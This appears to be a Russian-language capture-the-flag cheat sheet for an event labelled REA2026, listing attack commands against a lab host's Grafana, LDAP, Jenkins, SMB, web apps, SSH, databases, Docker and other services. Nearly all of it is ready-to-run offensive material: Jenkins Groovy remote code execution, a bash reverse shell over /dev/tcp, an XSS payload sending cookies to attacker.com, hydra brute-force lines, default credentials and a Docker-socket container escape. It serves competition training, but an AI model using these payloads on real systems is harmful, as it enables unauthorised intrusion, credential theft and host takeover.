# 🎯 Слабые места популярных сервисов (REA2026)

> Типичные векторы атаки для учебных сценариев. Сохраните в `~/flags/vulnerabilities_services.md`

---

## 📊 Grafana (порт 3000)

### Анонимный доступ
```bash
curl http://10.255.44.100:3000/api/dashboards/home
curl http://10.255.44.100:3000/api/search\?query\=*
```

### Где искать флаги:
- Названия/описания дашбордов
- Переменные шаблонов (`$__flag`)
- Аннотации к графикам
- Источники данных (особенно если есть доступ к базе)

### Стандартные пароли:
```
admin:admin
admin:password
admin:P@ssw0rd2026
```

---

## 🔐 FreeIPA / LDAP (порт 389/636)

### Анонимный поиск (часто разрешён!)
```bash
ldapsearch -x -h 10.255.44.100 -b "dc=reaskills,dc=cyber" "(objectClass=*)"
```

### Где искать флаги:
- Атрибуты пользователей: `description`, `comment`, `gecos`
- Названия групп
- Сертификаты (`userCertificate`)
- История входов (`krbLastSuccessfulAuth`)

### Распространённые ошибки:
- Анонимный поиск разрешён
- Слабые пароли администратора (`admin:P@ssw0rd2026`)
- Открытый доступ к `/ipa/ui` без аутентификации

---

## ⚙️ Jenkins (порт 8080)

### Анонимный доступ к билдам
```bash
curl http://10.255.44.100:8080/job/flag-job/lastBuild/consoleText
```

### RCE через /script (Groovy)
```bash
curl -X POST http://10.255.44.100:8080/scriptText --data "script=println%20%27cat%20/var/jenkins_home/secrets/flag.txt%27.execute().text"
```

### Где искать флаги:
- Логи последних билдов
- Переменные окружения (`env`)
- Credentials (через `/credentials/store/system/domain/_/`)
- Файлы в `/var/jenkins_home/`

### Распространённые ошибки:
- Анонимный доступ к `/script`
- Открытый доступ к `/job/*/lastBuild/consoleText`
- Слабые пароли (`admin:admin`)

---

## 📁 SMB (порт 445)

### Анонимный доступ (50% успеха в учебных сценариях!)
```bash
smbclient -L //10.255.44.100 -N
crackmapexec smb 10.255.44.100 -u '' -p '' --shares
```

### Где искать флаги:
- Общие папки: `flag`, `share`, `backup`, `confidential`
- Файлы: `flag.txt`, `proof.txt`, `credentials.txt`, `passwords.txt`
- Внутри документов Office/PDF

### Распространённые ошибки:
- Анонимный доступ к шарам
- Слабые пароли (`guest:guest`, `admin:admin`)
- Уязвимости: EternalBlue (MS17-010), PrintNightmare

---

## 🌐 Веб-приложения (80/443)

### Типичные уязвимости:

| Уязвимость | Проверка | Эксплуатация |
|------------|----------|--------------|
| **SQLi** | `' OR 1=1--` в параметрах | `sqlmap -u "http://...?id=1" --batch --dump` |
| **LFI** | `?page=../../etc/passwd` | `?page=/var/log/apache2/access.log` + log poisoning |
| **File Upload** | Загрузка `.php` | Обход через `.phtml`, `.php5`, двойное расширение |
| **Command Injection** | `; id`, `\| whoami` | `; bash -i >& /dev/tcp/10.255.44.1/4444 0>&1` |
| **XSS** | `<script>alert(1)</script>` | Steal cookies через `<img src=x onerror=document.location='http://attacker.com?c='+document.cookie>` |

### Обязательные проверки:
```bash
curl http://10.255.44.100/robots.txt
curl http://10.255.44.100/.git/HEAD
curl http://10.255.44.100/.env
curl http://10.255.44.100/backup.zip
```

---

## 🔒 SSH (порт 22)

### Распространённые ошибки:
- Слабые пароли (`root:root`, `admin:admin`, `user:P@ssw0rd2026`)
- Известные приватные ключи (проверить `/usr/share/ssh/`)
- Аутентификация по ключу без пароля

### Быстрый брутфорс:
```bash
hydra -L users.txt -p 'P@ssw0rd2026' ssh://10.255.44.100 -vV
```

---

## 🗄️ Базы данных

### MySQL (порт 3306)
```bash
mysql -h 10.255.44.100 -u root -p
# Часто без пароля:
mysql -h 10.255.44.100 -u root
```

### PostgreSQL (порт 5432)
```bash
psql -h 10.255.44.100 -U postgres
# Стандартный пароль:
psql -h 10.255.44.100 -U postgres -W  # пароль: postgres
```

### Где искать флаги:
- Таблицы: `flags`, `secrets`, `credentials`
- Поля: `flag`, `secret`, `token`, `password`

---

## 🐳 Docker / контейнеры

### Обнаружение
```bash
docker ps
docker images
ls -la /var/run/docker.sock  # Если есть доступ → бегство из контейнера
```

### Бегство из контейнера
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host /bin/sh
```

### Где искать флаги:
- Внутри контейнеров: `docker exec <container> grep -r "RS{" /`
- В образах: `docker save <image> | strings | grep "RS{"`
- В переменных окружения контейнеров

---

## 📡 Другие сервисы

| Сервис | Порт | Типичная уязвимость | Команда проверки |
|--------|------|---------------------|------------------|
| **FTP** | 21 | Анонимный доступ | `ftp 10.255.44.100` → `anonymous:anonymous` |
| **SNMP** | 161 | Слабые community strings | `snmpwalk -v2c -c public 10.255.44.100` |
| **Redis** | 6379 | Открытый доступ без пароля | `redis-cli -h 10.255.44.100 INFO` |
| **Elasticsearch** | 9200 | Анонимный доступ к данным | `curl http://10.255.44.100:9200/_search?q=flag` |
| **RDP** | 3389 | Слабые пароли | `hydra -L users.txt -P passwords.txt rdp://10.255.44.100` |
```